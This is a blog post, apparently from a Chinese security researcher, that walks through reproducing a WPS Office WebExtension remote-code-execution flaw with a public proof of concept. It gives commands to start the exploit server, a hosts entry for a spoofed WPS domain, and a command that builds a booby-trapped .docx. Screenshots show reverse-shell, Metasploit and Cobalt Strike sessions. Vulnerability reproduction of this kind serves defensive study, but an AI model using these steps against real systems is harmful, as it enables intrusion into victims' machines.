@@ -1,0 +1,877 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="yuBetter">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="preconnect" href="https://evan.beee.top" crossorigin>
+    
+        
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://example.com/2024/02/29/wps-rce/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="WPS-RCE受影响版本WPS Office 2023个人版＜11.1.0.15120；WPS Office 2019企业版＜11.8.2.12085 原理本次的漏洞，就是WPS在处理WebExtension时，未能正确的处理javascript代码，造成了溢出RCE Office 中的 WebExtension（通常称为 Office 插件或 Office 应用程序）是一种用于扩展 Micros">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WPS-RCE">
+<meta property="og:url" content="https://example.com/2024/02/29/WPS-RCE/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="WPS-RCE受影响版本WPS Office 2023个人版＜11.1.0.15120；WPS Office 2019企业版＜11.8.2.12085 原理本次的漏洞，就是WPS在处理WebExtension时，未能正确的处理javascript代码，造成了溢出RCE Office 中的 WebExtension（通常称为 Office 插件或 Office 应用程序）是一种用于扩展 Micros">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824093207374.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824093523106.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824093609422.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824094053627.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824094454425.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824100020207.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824095231441.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824100129471.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824123824650.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824124111773.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824124002442.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824124542373.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824124520108.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824124711308.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824125017958.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824125117510.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824125145833.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824130004962.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824125833208.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824125916286.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824130108452.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824130241726.png">
+<meta property="og:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824130942287.png">
+<meta property="article:published_time" content="2024-02-29T13:00:47.000Z">
+<meta property="article:modified_time" content="2024-02-29T13:01:32.146Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824093207374.png">
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/yubetter.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/yubetter.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/yubetter.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            WPS-RCE -
+        
+        Yu&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/assets/fonts.css">
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    let Global = window.Global || {};
+    Global.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[""]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":false,"percentage":true},"busuanzi_counter":{"enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"pjax":true,"open_graph":true},"home_banner":{"enable":true,"image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"好好学习，天天向上","subtitle":{"text":["有远大志向而脚踏实地，有障碍失败而不言放弃","静以修生，俭以养德，非淡泊无以明志，非宁静无以致远","即使慢，驰而不息，纵会落后，纵会失败，但一定可以达到他所向的目标","穷且益坚，不坠青云之志","莫不有始，鲜克有终","靡不有初,鲜克有终"],"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/yuBetter","instagram":null,"zhihu":null,"twitter":null,"email":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.1.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":false,"position":"left","announcement":null,"links":null},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}}};
+    Global.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/fontawesome/fontawesome.min.css">
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/fontawesome/brands.min.css">
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/fontawesome/solid.min.css">
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/fontawesome/regular.min.css">
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="main-content-container">
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Yu&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer">
+        <ul class="drawer-navbar-list">
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            
+             
+                <div class="article-title">         
+                    <img src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/F38CE3E6908E0B8025C860171F62CE50.png" alt="WPS-RCE" />
+                    <h1 class="article-title-cover">WPS-RCE</h1>
+                </div>
+            
+                
+            
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/yubetter-logon.svg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">yuBetter</span>
+                            
+                                <span class="author-label"></span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-02-29 21:47</span>
+        <span class="mobile">2024-02-29 21</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-02-29 21:01:32</span>
+            <span class="mobile">2024-02-29 21:01</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>520 Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>2 Mins</span>
+        </span>
+    
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content markdown-body">
+                <h1 id="WPS-RCE"><a href="#WPS-RCE" class="headerlink" title="WPS-RCE"></a>WPS-RCE</h1><h3 id="受影响版本"><a href="#受影响版本" class="headerlink" title="受影响版本"></a>受影响版本</h3><p>WPS Office 2023个人版＜11.1.0.15120；WPS Office 2019企业版＜11.8.2.12085</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>本次的漏洞，就是WPS在处理WebExtension时，未能正确的处理javascript代码，造成了溢出RCE</p>
+<p>Office 中的 WebExtension（通常称为 Office 插件或 Office 应用程序）是一种用于扩展 Microsoft Office 功能的技术。Office 插件使第三方开发者能够在 Office 应用程序中集成自己的服务和功能。这些插件采用跨平台的 Web 技术（如 HTML, CSS 和 JavaScript）开发，可以在不同的平台和设备上运行</p>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>下载poc进行利用，需要python3.8以上</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/ba0gu0/wps-rce" >https://github.com/ba0gu0/wps-rce <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>需要先下载依赖库</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">进入poc文件夹</span><br><span class="line">pip install -r requirement.txt -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824093207374.png"
+                      alt="image-20230824093207374"
+                ></p>
+<p>然后进入server文件夹</p>
+<p>运行main.py</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ./server/</span><br><span class="line">python3 main.py</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824093523106.png"
+                      alt="image-20230824093523106"
+                ></p>
+<p>然后就在本地开启了一个web服务，里面有具体利用的信息</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824093609422.png"
+                      alt="image-20230824093609422"
+                ></p>
+<p>在受害者主机上添加一个host以便域名访问</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IP地址  clientweb.docer.wps.cn.hhhwps.cn</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824094053627.png"
+                      alt="image-20230824094053627"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824094454425.png"
+                      alt="image-20230824094454425"
+                ></p>
+<h3 id="弹出计算器"><a href="#弹出计算器" class="headerlink" title="弹出计算器"></a>弹出计算器</h3><p>也就是访问就会弹出计算器</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://clientweb.docer.wps.cn.hhhwps.cn/calc</span><br></pre></td></tr></table></figure></div>
+
+<p>接下载需要我们整合到一个.docx中</p>
+<p>运行client的main.py用来生成文档文件</p>
+<p>进行client文件夹中，运行</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 main.py nihao.docx http://clientweb.docer.wps.cn.hhhwps.cn/calc </span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824100020207.png"
+                      alt="image-20230824100020207"
+                ></p>
+<p>实测新版的wps所生成的文档是不可注入的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824095231441.png"
+                      alt="image-20230824095231441"
+                ></p>
+<p>就生成了一个nihao.docx文档，带有payload的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824100129471.png"
+                      alt="image-20230824100129471"
+                ></p>
+<p>在目标主机上运行，即可弹出计算器</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824123824650.png"
+                      alt="image-20230824123824650"
+                ></p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>生成docx文档</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824124111773.png"
+                      alt="image-20230824124111773"
+                ></p>
+<p>服务端设置监听</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824124002442.png"
+                      alt="image-20230824124002442"
+                ></p>
+<p>上传文档并执行</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824124542373.png"
+                      alt="image-20230824124542373"
+                ></p>
+<p>服务端收到shell</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824124520108.png"
+                      alt="image-20230824124520108"
+                ></p>
+<h3 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h3><p>同理也是先生成文档</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824124711308.png"
+                      alt="image-20230824124711308"
+                ></p>
+<p>服务端设置监听</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824125017958.png"
+                      alt="image-20230824125017958"
+                ></p>
+<p>上传主机进行执行</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824125117510.png"
+                      alt="image-20230824125117510"
+                ></p>
+<p>攻击机收到shell</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824125145833.png"
+                      alt="image-20230824125145833"
+                ></p>
+<h3 id="上线cs"><a href="#上线cs" class="headerlink" title="上线cs"></a>上线cs</h3><p>先开启cs服务</p>
+<p>由于cs服务和poc服务的端口冲突，需要将poc服务端口改掉再启动</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824130004962.png"
+                      alt="image-20230824130004962"
+                ></p>
+<p>这边改成443端口</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824125833208.png"
+                      alt="image-20230824125833208"
+                ></p>
+<p>然后再次开启cs服务</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824125916286.png"
+                      alt="image-20230824125916286"
+                ></p>
+<p>cs启动！</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824130108452.png"
+                      alt="image-20230824130108452"
+                ></p>
+<p>照样生成文档</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824130241726.png"
+                      alt="image-20230824130241726"
+                ></p>
+<p>然后上传运行</p>
+<p>嗯嗯嫩~~</p>
+<p>主机上线不了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230824130942287.png"
+                      alt="image-20230824130942287"
+                ></p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> WPS-RCE</li>
+        <li><strong>Author:</strong> yuBetter</li>
+        <li><strong>Created at:</strong> 2024-02-29 21:00:47</li>
+        
+            <li>
+                <strong>Updated at:</strong> 2024-02-29 21:01:32
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://yubetter.github.io/2024/02/29/WPS-RCE/
+        </li>
+        <li>
+            <strong>License:</strong> This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>.
+        </li>
+    </ul>
+</div>
+
+                </div>
+            
+
+            
+
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                            rel="prev"
+                            href="/2024/02/29/%E8%A1%A5%E5%85%85%EF%BC%9AMS14-068/"
+                            >
+                                <span class="left arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-left"></i>
+                                </span>
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">补充：MS14-068</span>
+                                    <span class="post-nav-item">Prev posts</span>
+                                </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                            rel="next"
+                            href="/2024/02/29/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%9B%BE%E6%A0%87%E6%9B%BF%E6%8D%A2/"
+                            >
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">windows权限维持-图标替换</span>
+                                    <span class="post-nav-item">Next posts</span>
+                                </span>
+                                <span class="right arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+
+            
+                <div class="comment-container">
+                    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fa-solid fa-comments"></i>&nbsp;Comments
+    </div>
+    
+
+        
+            
+ 
+    <div id="waline"></div>
+    <script type="module"  data-pjax>
+        import { init } from 'https://evan.beee.top/js/waline.mjs';
+
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://example.example.com',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+            });
+        }
+
+        if ('true') {
+            const loadWalineTimeout = setTimeout(() => {
+                loadWaline();
+                clearTimeout(loadWalineTimeout);
+            }, 1000);
+        } else {
+            window.addEventListener('DOMContentLoaded', loadWaline);
+        }
+        
+    </script>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">WPS-RCE</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WPS-RCE"><span class="nav-text">WPS-RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%97%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-text">受影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0"><span class="nav-text">复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%B9%E5%87%BA%E8%AE%A1%E7%AE%97%E5%99%A8"><span class="nav-text">弹出计算器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8A%E7%BA%BFmsf"><span class="nav-text">上线msf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8A%E7%BA%BFcs"><span class="nav-text">上线cs</span></a></li></ol></li></ol></li></ol>
+
+    </div>
+</div>
+            </div>
+        
+    </div>
+</div>
+
+
+                
+
+            </div>
+            
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">yuBetter</a>
+        </div>
+        
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv" class="busuanzi_container_site_uv">
+                        VISITOR COUNT&nbsp;<span id="busuanzi_value_site_uv" class="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="busuanzi_container_site_pv">
+                        TOTAL PAGE VIEWS&nbsp;<span id="busuanzi_value_site_pv" class="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            <span class="powered-by-container">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a></span>
+                <br>
+            <span class="theme-version-container">THEME&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.1.1</a>
+        </div>
+        
+        
+        
+            <div id="start_div" style="display:none">
+                2022/8/17 11:45:14
+            </div>
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+        
+            <script async data-pjax>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
